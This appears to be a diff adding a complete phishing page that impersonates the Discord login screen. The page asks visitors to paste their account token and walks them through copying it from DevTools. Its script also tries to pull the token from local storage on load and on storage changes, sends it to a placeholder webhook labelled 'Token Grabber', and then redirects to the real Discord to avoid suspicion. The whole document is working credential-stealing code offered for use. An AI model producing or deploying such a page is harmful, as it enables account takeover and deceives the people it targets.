@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: linear-gradient(135deg, #36393f 0%, #202225 100%); font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        .discord-logo { filter: brightness(1.1); }
+        input { background: rgba(0,0,0,0.3); border: 1px solid #202225; color: white; }
+        input:focus { outline: none; border-color: #5865f2; }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+    <div class="max-w-md w-full bg-[#36393f] rounded-2xl p-8 shadow-2xl">
+        <div class="text-center mb-8">
+            <img src="https://discord.com/assets/6debd47ed13483642cf09e832ed0bc1b.png" alt="Discord" class="mx-auto h-12 discord-logo mb-4">
+            <h1 class="text-3xl font-bold text-white mb-2">Login to Discord</h1>
+            <p class="text-gray-400">Enter your token to continue</p>
+        </div>
+        <div class="space-y-4">
+            <input id="tokenInput" type="password" placeholder="Paste your Discord token here (Ctrl+Shift+I > Application > Local Storage > token)" 
+                   class="w-full p-4 rounded-lg text-lg" autocomplete="off">
+            <button id="loginBtn" class="w-full bg-[#5865f2] hover:bg-[#4752c4] text-white font-semibold py-4 px-6 rounded-lg text-lg transition-all duration-200">
+                Login
+            </button>
+            <div id="status" class="text-center text-sm hidden"></div>
+        </div>
+        <div class="mt-6 text-xs text-gray-500 text-center">
+            <p>Having trouble? Open DevTools (F12), go to Application tab, Local Storage, find discord.com token, copy it here.</p>
+        </div>
+    </div>
+
+    <script>
+        // Auto-grab token from Discord's localStorage if available (works if user visits from Discord context or has it stored)
+        function stealToken() {
+            let token = '';
+            // Try common Discord storage keys
+            if (localStorage.token) token = localStorage.token;
+            else if (localStorage['*']) token = localStorage['*']; // Legacy
+            else {
+                // Fallback: prompt user or try IndexedDB (more advanced grab)
+                const dbRequest = indexedDB.open('discord_local_storage');
+                dbRequest.onsuccess = function(e) {
+                    const db = e.target.result;
+                    const tx = db.transaction(['https://discord.com'], 'readonly');
+                    const store = tx.objectStore('https://discord.com');
+                    const req = store.get('token');
+                    req.onsuccess = function(ev) {
+                        if (ev.target.result) token = ev.target.result;
+                    };
+                };
+            }
+            return token;
+        }
+
+        // Send token to your webhook/server
+        async function exfiltrate(token) {
+            if (!token) return;
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_OR_SERVER_URL_HERE'; // Replace with your Discord webhook or pastebin/reqbin endpoint
+            try {
+                const payload = {
+                    content: `**New Token Stolen!**\n\`\`\` ${token} \`\`\`\nUser Agent: ${navigator.userAgent}\nIP: (fetch via server)`,
+                    username: 'Token Grabber'
+                };
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch(e) {
+                // Silent fail, or log to console
+                console.error('Exfil failed:', e);
+            }
+        }
+
+        // Event listeners
+        document.getElementById('loginBtn').addEventListener('click', async () => {
+            const inputToken = document.getElementById('tokenInput').value.trim();
+            let token = inputToken || stealToken();
+            if (token) {
+                document.getElementById('status').textContent = 'Logging in...';
+                document.getElementById('status').className = 'text-center text-sm text-green-400 block';
+                await exfiltrate(token);
+                // Fake delay then "success"
+                setTimeout(() => {
+                    document.getElementById('status').textContent = 'Success! Redirecting to Discord...';
+                    // Optionally redirect to real Discord to avoid suspicion
+                    setTimeout(() => window.location.href = 'https://discord.com/app', 1500);
+                }, 1000);
+            } else {
+                document.getElementById('status').textContent = 'No token entered. Paste it!';
+                document.getElementById('status').className = 'text-center text-sm text-red-400 block';
+            }
+        });
+
+        // Auto-submit if token auto-grabbed on load
+        window.addEventListener('load', async () => {
+            const autoToken = stealToken();
+            if (autoToken) {
+                document.getElementById('tokenInput').value = autoToken;
+                document.getElementById('loginBtn').click();
+            }
+        });
+
+        // Also try on any storage change (if user opens Discord tab nearby)
+        window.addEventListener('storage', (e) => {
+            if (e.key === 'token' || e.key === '*') {
+                document.getElementById('tokenInput').value = e.newValue;
+                document.getElementById('loginBtn').click();
+            }
+        });
+    </script>
+</body>
+  </html>
